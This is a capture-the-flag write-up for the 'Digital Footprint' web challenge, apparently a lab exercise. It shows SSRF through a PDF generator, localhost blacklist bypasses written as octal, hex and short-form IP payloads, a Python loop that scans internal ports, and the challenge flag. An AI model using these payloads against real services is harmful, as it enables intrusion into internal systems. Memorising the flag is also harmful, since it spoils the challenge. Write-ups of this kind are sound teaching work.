# Digital Footprint

**Category:** Web Exploitation
**Points:** 1200
**Description** The challenge presents a website with two main functionalities:

1. **Website Status Checker** (`/check` endpoint) - Monitors website availability
2. **PDF Report Generator** (`/generate-pdf` endpoint) - Generates PDF reports from URLs

## Solution

### Step 1: Initial Reconnaissance

**Findings:**

- Two forms accepting URL parameters
- `/check?url=` - Returns JSON with status
- `/generate-pdf?url=` - Generates PDF from URL

### Step 2: SSRF Discovery

Testing localhost access:

```python
# Direct localhost request - BLOCKED
/generate-pdf?url=http://localhost/admin
# Response: 403 Forbidden

/generate-pdf?url=http://127.0.0.1/admin
# Response: 403 Forbidden
```

The application has a blacklist preventing direct localhost access.

### Step 3: Localhost Blacklist Bypass

Tested various IP representation formats:

| Format     | Example               | Result                |
| ---------- | --------------------- | --------------------- |
| Decimal    | `http://2130706433/`  | ❌ Blocked            |
| Octal      | `http://0177.0.0.01/` | ✅ **BYPASSED**       |
| Hex        | `http://0x7f.0.0.1/`  | ✅ **BYPASSED**       |
| Short form | `http://127.1/`       | ✅ **BYPASSED**       |
| IPv6       | `http://[::1]/`       | ❌ Connection refused |

**Winner:** Octal representation `0177.0.0.01` successfully bypassed the localhost filter!

### Step 4: Port Scanning

Scanned internal ports using the `/check` endpoint to identify running services:

```python
# Scan ports 3000-3010, 5000-5010, 8000-8010
for port in range(8000, 8010):
    url = f"http://0177.0.0.01:{port}/"
    response = check_endpoint(url)
```

**Result:** Found application running on **port 8002**

```json
{
  "online": true,
  "status": 200
}
```

### Step 5: Endpoint Enumeration

Tested common endpoints on port 8002:

| Endpoint        | Status | Result             |
| --------------- | ------ | ------------------ |
| `/check`        | 200    | ✅ Accessible      |
| `/admin`        | 200    | ✅ **Flag found!** |
| `/flag`         | 500    | ❌ Not found       |
| `/generate-pdf` | 500    | ❌ Error           |

### Step 6: Flag Extraction

Accessed the admin panel via SSRF:

```bash
GET /generate-pdf?url=http://0177.0.0.01:8002/admin
```

The server generated a PDF containing the admin panel content. After downloading and extracting the PDF:

```
Welcome to the Admin Panel
Flag: CSC26{d1g1t4l_f00tpr1nt_tr41l}
```

## Flag

```
CSC26{d1g1t4l_f00tpr1nt_tr41l}
```
